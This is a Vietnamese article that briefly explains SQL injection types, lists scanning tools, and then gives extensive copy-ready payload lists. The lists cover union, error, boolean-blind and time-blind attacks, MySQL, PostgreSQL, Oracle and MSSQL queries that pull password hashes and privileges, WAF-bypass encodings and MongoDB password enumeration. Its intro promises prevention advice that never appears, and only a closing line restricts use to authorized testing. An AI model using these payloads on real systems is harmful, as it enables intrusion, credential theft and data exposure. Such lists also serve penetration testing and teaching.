# Danh sách Payload SQL Injection

Trong bài này, mình sẽ giải thích SQL injection là gì, một số ví dụ phổ biến, giải thích cách tìm và khai thác các loại lỗ hổng SQL injection và cách ngăn chặn SQL injection.

## SQL injection (SQLi) là gì?

SQL injection là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào các truy vấn mà ứng dụng thực hiện đối với cơ sở dữ liệu của nó. Nó thường cho phép kẻ tấn công xem dữ liệu mà chúng thường không thể lấy. Bao gồm dữ liệu thuộc về người dùng hoặc bất kỳ dữ liệu nào khác mà bản thân ứng dụng có thể truy cập. Trong nhiều trường hợp, kẻ tấn công có thể sửa đổi hoặc xóa dữ liệu này, gây ra các thay đổi liên tục đối với nội dung hoặc hành vi của ứng dụng.

Trong một số tình huống, kẻ tấn công có thể leo thang một cuộc tấn công SQL injection để xâm phạm máy chủ hoặc cơ sở hạ tầng back-end hoặc thực hiện một cuộc tấn công từ chối dịch vụ.

### Các loại SQL injection:

- **In-band SQLi (SQLi cổ điển):** In-band SQLi là phương thức tấn công SQL Injection phổ biến và dễ khai thác nhất. In-band SQL Injection xảy ra khi kẻ tấn công có thể sử dụng cùng một kênh liên lạc để khởi động cuộc tấn công và thu thập kết quả. Hai loại SQL Injection phổ biến nhất là SQLi dựa trên lỗi và SQLi dựa trên Union.

- **SQLi dựa trên lỗi:** SQLi dựa trên lỗi là một kỹ thuật in-band SQL dựa vào các thông báo lỗi do máy chủ cơ sở dữ liệu đưa ra để lấy thông tin về cấu trúc của cơ sở dữ liệu. Trong một số trường hợp, chỉ riêng việc chèn SQL dựa trên lỗi là đủ để kẻ tấn công liệt kê toàn bộ cơ sở dữ liệu.

- **SQLi dựa trên Union:** SQLi dựa trên Union là một kỹ thuật tiêm SQL in-band sử dụng toán tử SQL UNION để kết hợp các kết quả của hai hoặc nhiều câu lệnh SELECT thành một kết quả duy nhất, sau đó được trả về như một phần của phản hồi HTTP.

- **SQLi Suy luận(Blind SQLi):** SQLi Suy luận, không giống như SQL in-band, có thể mất nhiều thời gian hơn để kẻ tấn công khai thác, tuy nhiên, nó cũng nguy hiểm như bất kỳ dạng SQL Injection nào khác. Trong một cuộc tấn công SQLi Suy luận, không có dữ liệu nào thực sự được chuyển qua ứng dụng web và kẻ tấn công sẽ không thể nhìn thấy kết quả của một cuộc tấn công in-band (đó là lý do tại sao các cuộc tấn công như vậy thường được gọi là "tấn công mù SQL Injection"). Thay vào đó, kẻ tấn công có thể xây dựng lại cấu trúc cơ sở dữ liệu bằng cách gửi payloads, quan sát phản hồi của ứng dụng web và kết quả của máy chủ cơ sở dữ liệu. Hai kiểu SQL Injection suy luận là SQLi dựa trên Blind-boolean và SQLi dựa trên thời gian mù.

- **SQLi mù dựa trên Boolean (dựa trên nội dung):** SQL Injection dựa trên Boolean là một kỹ thuật SQL Injection suy luận dựa trên việc gửi một truy vấn SQL đến cơ sở dữ liệu, buộc ứng dụng trả về một kết quả khác tùy thuộc vào việc truy vấn trả về TRUE hay FALSE. Tùy thuộc vào kết quả, nội dung bên trong phản hồi HTTP sẽ thay đổi hoặc giữ nguyên. Điều này cho phép kẻ tấn công suy luận xem payload được sử dụng trả về true hay false, mặc dù không có dữ liệu nào từ cơ sở dữ liệu được trả về.

- **SQLi mù dựa trên thời gian:** SQL Injection dựa trên thời gian là một kỹ thuật SQL Injection suy luận dựa trên việc gửi một truy vấn SQL đến cơ sở dữ liệu, buộc cơ sở dữ liệu phải đợi một khoảng thời gian cụ thể (tính bằng giây) trước khi phản hồi. Thời gian phản hồi sẽ cho kẻ tấn công biết kết quả của truy vấn là TRUE hay FALSE. Tùy thuộc vào kết quả, phản hồi HTTP sẽ được trả lại trễ hoặc trả về ngay lập tức. Điều này cho phép kẻ tấn công suy luận xem payload được sử dụng trả về true hay false, mặc dù không có dữ liệu nào từ cơ sở dữ liệu được trả về.

- **SQLi ngoài băng tần:** SQL Injection ngoài băng tần không phổ biến lắm, chủ yếu là do nó phụ thuộc vào các tính năng được bật trên máy chủ cơ sở dữ liệu đang được ứng dụng web sử dụng. SQL Injection ngoài băng tần xảy ra khi kẻ tấn công không thể sử dụng cùng một kênh để khởi động cuộc tấn công và thu thập kết quả. Các kỹ thuật ngoài băng tần, cung cấp cho kẻ tấn công một giải pháp thay thế cho các kỹ thuật dựa trên thời gian suy diễn, đặc biệt nếu phản hồi của máy chủ không ổn định lắm (làm cho một cuộc tấn công dựa trên thời gian suy diễn không đáng tin cậy).

- **Sql Injection dựa trên âm thanh:** Đây là một phương pháp tấn công sql injection có thể được áp dụng trong các ứng dụng cung cấp quyền truy cập vào cơ sở dữ liệu bằng lệnh thoại. Kẻ tấn công có thể lấy thông tin từ cơ sở dữ liệu bằng cách gửi các truy vấn sql kèm theo âm thanh.

### Các công cụ quét lỗ hổng SQL Injection:

- SQLMap – Công cụ quét cơ sở dữ liệu và tiêm SQL tự động
- jSQL Injection – Công cụ Java để tiêm SQL tự động
- BBQSQL – Một công cụ khai thác SQL-Injection mù
- NoSQLMap – Pwnage cơ sở dữ liệu NoSQL tự động
- Whitewidow – Máy quét lỗ hổng SQL
- DSSS – Máy quét lỗ hổng SQLi nhỏ
- explore – Định dạng kiểm tra lỗ hổng trên web
- Blind-Sql-Bitshifting – Blind SQL-Injection qua Bitshifting
- Leviathan – Bộ công cụ kiểm tra hàng loạt trên phạm vi rộng
- Blisqy – Khai thác phương thức tiêm SQL mù dựa trên thời gian trong HTTP-Headers (MySQL / MariaDB)

## Các payload SQL Injection chung

```
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or #
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/
+        addition, concatenate (or space in url)
||        (double pipe) concatenate
%        wildcard attribute indicator
@variable    local variable
@@variable    global variable
# Numeric
AND 1
AND 0
AND true
AND false
1-false
1-true
1*56
-2
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --
-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --
-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@
1 AND (SELECT * FROM Users) = 1
' AND MID(VERSION(),1,1) = '5';
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
Finding the table name
Time-Based:
,(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--
Comments:
#        Hash comment
/*      C-style comment
-- -    SQL comment
;%00    Nullbyte
`        Backtick
```

## Các payload dựa trên lỗi

```
' OR (SELECT COUNT(*) FROM tablename) >= 0 --
' AND (SELECT COUNT(*) FROM tablename) >= 0 --
' AND (SELECT COUNT(*) FROM information_schema.tables) >= 0 --
' OR 1 GROUP BY CONCAT_WS(0x3a, VERSION(), DATABASE(), USER()) HAVING MIN(0) --
' OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),DATABASE(),USER()) HAVING MIN(0) --
' UNION SELECT 1,COUNT(*),CONCAT_WS(0x3a,VERSION(),DATABASE(),USER()) x FROM information_schema.tables GROUP BY x --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 --
```

## Payload Union-based

```
' UNION SELECT 1 --
' UNION SELECT 1,2 --
' UNION SELECT 1,2,3 --
' UNION SELECT 1,2,3,4 --
' UNION SELECT 1,2,3,4,5 --
' UNION SELECT 1,2,3,4,5,6 --
' UNION SELECT 1,2,3,4,5,6,7 --
' UNION SELECT 1,2,3,4,5,6,7,8 --
' UNION SELECT 1,2,3,4,5,6,7,8,9 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 --
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 --
```

## Payload Boolean-based blind

```
' AND 1=1 --
' AND 1=2 --
' AND 'a'='a' --
' AND 'a'='b' --
' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
' AND (SELECT COUNT(*) FROM information_schema.tables) > 1000 --
' AND (SELECT LENGTH(DATABASE())) > 0 --
' AND (SELECT LENGTH(DATABASE())) = 1 --
' AND (SELECT LENGTH(DATABASE())) = 2 --
' AND (SELECT LENGTH(DATABASE())) = 3 --
' AND (SELECT LENGTH(DATABASE())) = 4 --
' AND (SELECT LENGTH(DATABASE())) = 5 --
' AND (SELECT LENGTH(DATABASE())) = 6 --
' AND (SELECT LENGTH(DATABASE())) = 7 --
' AND (SELECT LENGTH(DATABASE())) = 8 --
' AND (SELECT LENGTH(DATABASE())) = 9 --
' AND (SELECT LENGTH(DATABASE())) = 10 --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'a' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'b' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'c' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'd' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'e' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'f' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'g' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'h' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'i' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'j' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'k' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'l' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'm' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'n' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'o' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'p' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'q' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'r' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 's' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 't' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'u' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'v' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'w' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'x' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'y' --
' AND (SELECT SUBSTRING(DATABASE(),1,1)) = 'z' --
```

## Payload Time-based blind

```
' AND SLEEP(5) --
' AND (SELECT SLEEP(5)) --
' AND (SELECT SLEEP(5) FROM DUAL) --
' AND IF(1=1,SLEEP(5),0) --
' AND IF(1=2,SLEEP(5),0) --
' AND IF((SELECT COUNT(*) FROM information_schema.tables) > 0,SLEEP(5),0) --
' AND IF((SELECT COUNT(*) FROM information_schema.tables) > 1000,SLEEP(5),0) --
' AND IF((SELECT LENGTH(DATABASE())) = 1,SLEEP(5),0) --
' AND IF((SELECT LENGTH(DATABASE())) = 2,SLEEP(5),0) --
' AND IF((SELECT LENGTH(DATABASE())) = 3,SLEEP(5),0) --
' AND IF((SELECT LENGTH(DATABASE())) = 4,SLEEP(5),0) --
' AND IF((SELECT LENGTH(DATABASE())) = 5,SLEEP(5),0) --
' AND IF((SELECT LENGTH(DATABASE())) = 6,SLEEP(5),0) --
' AND IF((SELECT LENGTH(DATABASE())) = 7,SLEEP(5),0) --
' AND IF((SELECT LENGTH(DATABASE())) = 8,SLEEP(5),0) --
' AND IF((SELECT LENGTH(DATABASE())) = 9,SLEEP(5),0) --
' AND IF((SELECT LENGTH(DATABASE())) = 10,SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'a',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'b',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'c',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'd',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'e',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'f',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'g',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'h',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'i',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'j',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'k',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'l',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'm',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'n',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'o',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'p',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'q',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'r',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 's',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 't',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'u',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'v',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'w',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'x',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'y',SLEEP(5),0) --
' AND IF((SELECT SUBSTRING(DATABASE(),1,1)) = 'z',SLEEP(5),0) --
```

## Payload cho MySQL

```
' UNION SELECT 1,VERSION(),DATABASE(),USER(),5 --
' UNION SELECT 1,@@version,@@datadir,USER(),5 --
' UNION SELECT 1,table_name,column_name,4,5 FROM information_schema.columns --
' UNION SELECT 1,table_schema,table_name,4,5 FROM information_schema.tables --
' UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata --
' UNION SELECT 1,user,password,4,5 FROM mysql.user --
' UNION SELECT 1,host,user,password,5 FROM mysql.user --
' UNION SELECT 1,grantee,privilege_type,is_grantable,5 FROM information_schema.user_privileges --
' UNION SELECT 1,variable_name,variable_value,4,5 FROM information_schema.global_variables --
' UNION SELECT 1,variable_name,variable_value,4,5 FROM information_schema.session_variables --
' UNION SELECT 1,engine,support,comment,5 FROM information_schema.engines --
' UNION SELECT 1,plugin_name,plugin_status,plugin_type,plugin_library FROM information_schema.plugins --
```

## Payload cho PostgreSQL

```
' UNION SELECT 1,version(),current_database(),current_user(),5 --
' UNION SELECT 1,datname,3,4,5 FROM pg_database --
' UNION SELECT 1,schemaname,tablename,4,5 FROM pg_tables --
' UNION SELECT 1,table_name,column_name,data_type,5 FROM information_schema.columns --
' UNION SELECT 1,usename,passwd,4,5 FROM pg_shadow --
' UNION SELECT 1,usename,usesuper,usecreatedb,5 FROM pg_user --
' UNION SELECT 1,rolname,rolsuper,rolcreatedb,rolcreaterole FROM pg_roles --
```

## Payload cho Oracle

```
' UNION SELECT 1,banner,3,4,5 FROM v$version --
' UNION SELECT 1,username,password,4,5 FROM dba_users --
' UNION SELECT 1,owner,table_name,4,5 FROM all_tables --
' UNION SELECT 1,table_name,column_name,data_type,5 FROM all_tab_columns --
' UNION SELECT 1,privilege,grantee,4,5 FROM dba_sys_privs --
' UNION SELECT 1,granted_role,grantee,admin_option,5 FROM dba_role_privs --
```

## Payload cho Microsoft SQL Server

```
' UNION SELECT 1,@@version,DB_NAME(),USER_NAME(),5 --
' UNION SELECT 1,name,database_id,4,5 FROM sys.databases --
' UNION SELECT 1,name,object_id,schema_id,5 FROM sys.tables --
' UNION SELECT 1,name,column_id,system_type_id,5 FROM sys.columns --
' UNION SELECT 1,name,principal_id,type_desc,5 FROM sys.server_principals --
' UNION SELECT 1,name,database_id,type_desc,5 FROM sys.database_principals --
```

## Payload WAF Bypass

```
/*!UNION*/ /*!SELECT*/ 1,2,3 --
/**/UNION/**/SELECT/**/1,2,3 --
+UNION+SELECT+1,2,3 --
%0AUNION%0ASELECT%0A1,2,3 --
UNION%0ASELECT%0A1,2,3 --
UNION%20SELECT%201,2,3 --
UNION%09SELECT%091,2,3 --
UNION%0CSELECT%0C1,2,3 --
UNION%0DSELECT%0D1,2,3 --
UNION%0BSELECT%0B1,2,3 --
UNION%A0SELECT%A01,2,3 --
%55NION %53ELECT 1,2,3 --
uni%6fn sel%65ct 1,2,3 --
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 --
' /*!12345UNION*/ /*!12345SELECT*/ 1,2,3 --
```

## Payload NoSQL Injection (MongoDB)

```
' || 1==1 //
' || 1==1 %00
' || '1'=='1
' || true //
' || []//
' || 1 //
' || this.password.match(/.*/)//
' || this.passwordzz.match(/.*/)//
' || this.password.match(/^a.*$/)//
' || this.password.match(/^b.*$/)//
' || this.password.match(/^c.*$/)//
' || this.password.match(/^d.*$/)//
' || this.password.match(/^e.*$/)//
' || this.password.match(/^f.*$/)//
' || this.password.match(/^g.*$/)//
' || this.password.match(/^h.*$/)//
' || this.password.match(/^i.*$/)//
' || this.password.match(/^j.*$/)//
' || this.password.match(/^k.*$/)//
' || this.password.match(/^l.*$/)//
' || this.password.match(/^m.*$/)//
' || this.password.match(/^n.*$/)//
' || this.password.match(/^o.*$/)//
' || this.password.match(/^p.*$/)//
' || this.password.match(/^q.*$/)//
' || this.password.match(/^r.*$/)//
' || this.password.match(/^s.*$/)//
' || this.password.match(/^t.*$/)//
' || this.password.match(/^u.*$/)//
' || this.password.match(/^v.*$/)//
' || this.password.match(/^w.*$/)//
' || this.password.match(/^x.*$/)//
' || this.password.match(/^y.*$/)//
' || this.password.match(/^z.*$/)//
```

## Kết luận

SQL Injection là một trong những lỗ hổng bảo mật nghiêm trọng nhất trong các ứng dụng web. Việc hiểu rõ các loại SQL injection và cách thức hoạt động của chúng là rất quan trọng để có thể phòng chống hiệu quả. Danh sách payload trên đây cung cấp một cái nhìn tổng quan về các kỹ thuật tấn công SQL injection phổ biến, giúp các chuyên gia bảo mật có thể kiểm tra và bảo vệ hệ thống của mình tốt hơn.

Việc sử dụng các payload này chỉ nên được thực hiện trong môi trường kiểm thử được ủy quyền và với mục đích học tập, nghiên cứu bảo mật. Việc sử dụng chúng để tấn công các hệ thống không được phép là bất hợp pháp và có thể dẫn đến hậu quả pháp lý nghiêm trọng.